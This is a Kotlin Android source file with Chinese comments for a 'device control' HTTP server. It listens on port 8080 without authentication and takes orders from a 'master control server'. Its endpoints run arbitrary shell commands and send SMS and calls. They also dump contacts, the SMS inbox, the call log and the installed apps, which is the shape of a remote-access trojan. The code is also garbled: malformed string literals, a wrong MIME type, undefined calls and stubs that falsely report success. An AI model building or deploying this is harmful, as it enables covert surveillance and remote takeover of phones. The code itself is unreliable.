package com.wireless.control.device.server

import android.util.Log
import fi.iki.elonen.nanohttpd.NanoHTTPD
import fi.iki.elonen.nanohttpd.NanoHTTPD.Response
import fi.iki.elonen.nanohttpd.router.RouterNanoHTTPD
import fi.iki.elonen.nanohttpd.response.Response.newFixedLengthResponse
import fi.iki.elonen.nanohttpd.response.Response.Status
import org.json.JSONObject

/**
 * 设备控制API服务器
 *
 * 监听端口：8080
 * 主要功能：
 * 1. 接收主控服务器指令
 * 2. 执行设备操作
 * 3. 返回操作结果
 * 4. 心跳保持
 */
class DeviceControlServer(private val port: Int = 8080) : RouterNanoHTTPD(port) {

    companion object {
        private const val TAG = "DeviceControlServer"
        private const val SERVER_IP = "192.168.1.1" // 主控服务器IP
        private const val SERVER_PORT = 5000
    }

    private var isRunning = false

    /**
     * 启动服务器
     */
    fun start(): Boolean {
        if (isRunning) {
            Log.w(TAG, "Server is already running")
            return true
        }

        try {
            start(NanoHTTPD.SOCKET_READ_TIMEOUT, false)
            isRunning = true
            Log.i(TAG, "Server started on port $port")
            return true

        } catch (e: Exception) {
            Log.e(TAG, "Failed to start server", e)
            return false
        }
    }

    /**
     * 停止服务器
     */
    fun stop(): Boolean {
        if (!isRunning) {
            Log.w(TAG, "Server is not running")
            return true
        }

        try {
            stop()
            isRunning = false
            Log.i(TAG, "Server stopped")
            return true

        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop server", e)
            return false
        }
    }

    /**
     * 路由配置
     */
    override fun serve(session: IHTTPSession): Response {
        val uri = session.uri
        val method = session.method.name

        Log.d(TAG, "Request: $method $uri")

        return when {
            // 获取设备状态
            uri == "/api/status" && method == "GET" -> getStatus()

            // 获取设备信息
            uri == "/api/device/info" && method == "GET" -> getDeviceInfo()

            // 执行命令
            uri == "/api/execute" && method == "POST" -> executeCommand(session)

            // 获取应用列表
            uri == "/api/apps" && method == " GET" -> getApps()

            // 启动应用
            uri == "/api/apps/start" && method == "POST" -> startApp(session)

            // 停止应用
            uri == "/api/apps/stop" && method == "POST" -> stopApp(session)

            // 发送短信
            uri == "/api/sms/send" && method == "POST" -> sendSMS(session)

            // 拨打电话
            uri == "/api/call/make" && method == "POST" -> makeCall(session)

            // 获取联系人
            uri == "/api/contacts" && method == "GET" -> getContacts()

            // 获取短信列表
            uri == "/api/sms/list" && method == "GET" -> getSMSList()

            // 获取通话记录
            uri == "/api/calls/list" && method == "GET" -> getCallLog()

            // 获取通知列表
            uri == "/api/notifications" && method == "GET" -> getNotifications()

            // 心跳检测
            uri == "/api/heartbeat" && method == "GET" -> heartbeat()

            // 默认响应
            else -> newFixedLengthResponse(
                Status.NOT_FOUND,
                "application/json",
                """{"code":404,"message":"Not Found"}"""
            )
        }
    }

    /**
     * 获取设备状态
     */
    private fun getStatus(): Response {
        return try {
            val status = JSONObject()
            status.put("code", 200)
            status.put("status", "online")
            status.put("server_port", port)
            status.put("timestamp", System.currentTimeMillis())

            val deviceInfo = JSONObject()
            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER)
            deviceInfo.put("model", android.os.Build.MODEL)
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE)
            deviceInfo.put("api_level", android.os.Build.VERSION.SDK_INT)
            status.put("device", deviceInfo)

            newFixedLengthResponse(
                Status.OK,
                "application/json",
                status.toString()
            )

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 获取设备详细信息
     */
    private fun getDeviceInfo(): Response {
        return try {
            val info = JSONObject()
            info.put("code", 200)

            val device = JSONObject()
            device.put("manufacturer", android.os.Build.MANUFACTURER)
            device.put("brand", android.os.Build.BRAND)
            device.put("model", android.os.Build.MODEL)
            device.put("product", android.os.Build.PRODUCT)
            device.put("android_version", android.os.Build.VERSION.RELEASE)
            device.put("android_id", android.os.Build.SERIAL)
            device.put("api_level", android.os.Build.VERSION.SDK_INT)
            device.put("build_id", android.os.Build.DISPLAY)
            device.put("fingerprint", android.os.Build.FINGERPRINT)

            val network = JSONObject()
            network.put("wifi_enabled", isWifiEnabled())
            network.put("network_type", getNetworkType())
            device.put("network", network)

            val battery = JSONObject()
            battery.put("level", getBatteryLevel())
            battery.put("is_charging", isCharging())
            device.put("battery", battery)

            info.put("device", device)

            newFixedLengthResponse(
                Status.OK,
                " "application/json",
                info.toString()
            )

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 执行命令
     */
    private fun executeCommand(session: IHTTPSession): Response {
        return try {
            val requestBody = String(session.inputStream.readBytes())
            val json = JSONObject(requestBody)

            val command = json.optString("command", "")
            val params = json.optJSONObject("params")

            Log.d(TAG, "Executing command: $command")

            val result = when (command) {
                "shell" -> executeShellCommand(params)
                "input" -> sendInput(params)
                "swipe" -> performSwipe(params)
                "click" -> performClick(params)
                else -> JSONObject().apply {
                    put("code", 400)
                    put("message", "Unknown command")
                }
            }

            newFixedLengthResponse(
                Status.OK,
                "application/json",
                result.toString()
            )

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 执行Shell命令
     */
    private fun executeShellCommand(params: JSONObject): JSONObject {
        return try {
            val command = params.optString("command", "")
            val runtime = Runtime.getRuntime()
            val process = runtime.exec(command)

            val output = process.inputStream.bufferedReader().use { it.readText() }
            val error = process.errorStream.bufferedReader().use { it.readText() }
            val exitCode = process.waitFor()

            val result = JSONObject()
            result.put("code", if (exitCode == 0) 200 else 500)
            result.put("command", command)
            result.put("exit_code", exitCode)
            result.put("output", output)
            result.put("error", error)

            result

        } catch (e: Exception) {
            JSONObject().apply {
                put("code", 500)
                put("message", e.message)
            }
        }
    }

    /**
     * 发送输入事件
     */
    private fun sendInput(params: JSONObject): JSONObject {
        return try {
            val text = params.optString("text", "")
            val x = params.optInt("x", 0)
            val y = params.optInt("y", 0)

            // TODO: 实现输入注入
            val result = JSONObject()
            result.put("code", 200)
            result.put("message", "Input sent successfully")
            result.put("text", text)

            result

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 执行滑动操作
     */
    private fun performSwipe(params: JSONObject): JSONObject {
        return try {
            val startX = params.optInt("startX", 0)
            val startY = params.optInt("startY", 0)
            val endX = params.optInt("endX", 0)
            val endY = params.optInt("endY", 0)
            val duration = params.optInt("duration", 500)

            // TODO: 实现滑动
            val result = JSONObject()
            result.put("code", 200)
            result.put("message", "Swipe performed")

            result

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 执行点击操作
     */
    private fun performClick(params: JSONObject): JSONObject {
        return try {
            val x = params.optInt("x", 0)
            val y = params.optInt("y", 0)

            // TODO: 实现点击
            val result = JSONObject()
            result.put("code", 200)
            result.put("message", "Click performed")

            result

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 获取应用列表
     */
    private fun getApps(): Response {
        return try {
            val result = JSONObject()
            result.put("code", 200)

            val apps = android.content.ContextWrapper().packageManager.getInstalledPackages(0)
                .map { packageInfo ->
                    val app = JSONObject()
                    app.put("package_name", packageInfo.packageName)
                    app.put("app_name", packageInfo.applicationInfo.loadLabel(context).toString())
                    app.put("version", packageInfo.versionName)
                    app.put("version_code", packageInfo.versionCode)
                    app
                }

            result.put("apps", apps)

            newFixedLengthResponse(
                Status.OK,
                "application/json",
                result.toString()
            )

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 启动应用
     */
    private fun startApp(session: IHTTPSession): Response {
        return try {
            val requestBody = String(session.inputStream.readBytes())
            val json = JSONObject(requestBody)

            val packageName = json.optString("package_name", "")

            val intent = context.packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                context.startActivity(intent)

                val result = JSONObject()
                result.put("code", 200)
                result.put("message", "App started successfully")
                result.put("package_name", packageName)

                newFixedLengthResponse(
                    Status.OK,
                    "application/json",
                    result.toString()
                )
            } else {
                errorResponse("App not found")
            }

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 停止应用
     */
    private fun stopApp(session: IHTTPSession): Response {
        return try {
            val requestBody = String(session.inputStream.readBytes())
            val json = JSONObject(requestBody)

            val packageName = json.optString("package_name", "")

            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            am.killBackgroundProcesses(packageName)

            val result = JSONObject()
            result.put("code", 200)
            result.put("message", "App stopped successfully")
            result.put("package_name", packageName)

            newFixedLengthResponse(
                Status.OK,
                "application/json",
                result.toString()
            )

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 发送短信
     */
    private fun sendSMS(session: IHTTPSession): Response {
        return try {
            val requestBody = String(session.inputStream.readBytes())
            val json = JSONObject(requestBody)

            val phoneNumber = json.optString("phone_number", "")
            val message = json.optString("message", "")

            val intent = android.content.Intent(android.content.Intent.ACTION_SENDTO)
            intent.putExtra("address", phoneNumber)
            intent.putExtra("sms_body", message)

            context.startActivity(intent)

            val result = JSONObject()
            result.put("code", 200)
            result.put("message", "SMS sent successfully")

            newFixedLengthResponse(
                Status.OK,
                "application/json",
                result.toString()
            )

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 拨打电话
     */
    private fun makeCall(session: IHTTPSession): Response {
        return try {
            val requestBody = String(session.inputStream.readBytes())
            val json = JSONObject(requestBody)

            val phoneNumber = json.optString("phone_number", "")

            val intent = android.content.Intent(android.content.Intent.ACTION_CALL, android.net.Uri.parse("tel:$phoneNumber"))
            context.startActivity(intent)

            val result = JSONObject()
            result.put("code", 200)
            result.put("message", "Call started")

            newFixedLengthResponse(
                Status.OK,
                "command/json",
                result.toString()
            )

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 获取联系人
     */
    private fun getContacts(): Response {
        return try {
            val result = JSONObject()
            result.put("code", 200)

            val contacts = mutableListOf<JSONObject>()
            val cursor = context.contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null,
                null,
                null
            )

            while (cursor.moveToNext()) {
                val contact = JSONObject()
                contact.put("name", cursor.getString(0))
                contact.put("phone", cursor.getString(1))
                contacts.add(contact)
            }
            cursor.close()

            result.put("contacts", contacts)

            newFixedLengthResponse(
                Status.OK,
                "application/json",
                result.toString()
            )

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 获取短信列表
     */
    private fun getSMSList(): Response {
        return try {
            val result = JSONObject()
            result.put("code", 200)

            val smsList = mutableListOf<JSONObject>()
            val cursor = context.contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                arrayOf(
                    "address", "body", "date", "read"
                ),
                null,
                "date DESC",
                "100"
            )

            while (cursor.moveToNext()) {
                val sms = JSONObject()
                sms.put("address", cursor.getString(0))
                sms.put("body", cursor.getString(1))
                sms.put("date", cursor.getLong(2))
                sms.put("read", cursor.getInt(3) == 1)
                smsList.add(sms)
            }
            cursor.close()

            result.put("sms_list", smsList)

            newFixedLengthResponse(
                Status.OK,
                "application/json",
                result.toString()
            )

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 获取通话记录
     */
    private fun getCallLog(): Response {
        return try {
            val result = JSONObject()
            result.put("code", 200)

            val callLog = mutableListOf<JSONObject>()
            val cursor = context.contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                arrayOf(
                    android.provider.CallLog.Calls.NUMBER,
                    android.provider.CallLog.Calls.TYPE,
                    android.provider.CallLog.Calls.DATE,
                    android.provider.CallLog.Calls.DURATION
                ),
                null,
                android.provider.CallLog.Calls.DEFAULT_SORT_ORDER,
                "50"
            )

            while (cursor.moveToNext()) {
                val call = JSONObject()
                call.put("number", cursor.getString(0))
                call.put("type", cursor.getString(1))
                call.put("date", cursor.getLong(2))
                call.put("duration", cursor.getLong(3))
                callLog.add(call)
            }
            cursor.close()

            result.put("call_log", callLog)

            newFixedLengthResponse(
                Status.OK,
                "application/json",
                result.toString()
            )

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 获取通知列表
     */
    private fun getNotifications(): Response {
        return try {
            val result = JSONObject()
            result.put("code", 200)

            val notifications = mutableListOf<JSONObject>()
            // TODO: 通过AccessibilityService获取通知

            result.put("notifications", notifications)

            newFixedLength(
                Status.OK,
                "application/json",
                result.toString()
            )

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 心跳检测
     */
    private fun heartbeat(): Response {
        return try {
            val heartbeat = JSONObject()
            heartbeat.put("code", 200)
            heartbeat.put("status", "alive")
            heartbeat.put("timestamp", System.currentTimeMillis())

            newFixedLengthResponse(
                Status.OK,
                "application/json",
                heartbeat.toString()
            )

        } catch (e: Exception) {
            errorResponse(e)
        }
    }

    /**
     * 错误响应
     */
    private fun errorResponse(e: Exception): Response {
        val error = JSONObject()
        error.put("code", 500)
        error.put("message", e.message ?: "Internal server error")

        return newFixedLengthResponse(
            Status.INTERNAL_ERROR,
            "application/json",
            error.toString()
        )
    }

    private fun errorResponse(message: String): Response {
        val error = JSONObject()
        error.put("code", 500)
        error.put("message", message)

        return newFixedLengthResponse(
            Status.INTERNAL_ERROR,
            "application/json",
            error.toString()
        )
    }

    /**
     * 检查WiFi是否开启
     */
    private fun isWifiEnabled(): Boolean {
        val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
        return wifiManager.isWifiEnabled
    }

    /**
     * 获取网络类型
     */
    private fun getNetworkType(): String {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        val activeNetwork = connectivityManager.activeNetworkInfo ?: return "none"
        return when (activeNetwork.type) {
            android.net.ConnectivityManager.TYPE_WIFI -> "wifi"
            android.net.ConnectivityManager.TYPE_MOBILE -> "mobile"
            else -> "unknown"
        }
    }

    /**
     * 获取电池电量
     */
    private fun getBatteryLevel(): Int {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        return batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    /**
     * 是否在充电
     */
    private fun isCharging(): Boolean {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        return batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_STATUS) ==
                android.os.BatteryManager.BATTERY_STATUS_CHARGING
    }
}
